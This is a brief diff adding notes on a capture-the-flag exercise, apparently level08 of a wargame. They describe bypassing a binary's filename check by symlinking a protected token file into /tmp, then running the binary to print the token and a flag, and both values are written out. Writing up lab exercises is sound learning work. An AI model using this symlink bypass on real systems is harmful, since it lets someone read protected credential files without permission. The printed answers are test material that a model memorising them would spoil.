@@ -1,0 +1,10 @@
+Inspect file level08
+- Check passed file acces
+
+Symbolic link
+- ln -s /home/user/level08/token /tmp/link
+
+Run
+- ./level08 /tmp/link
+-> quif5eloekouj29ke0vouxean
+-> 25749xKZ8L7DkSCwJkT9dyv6f
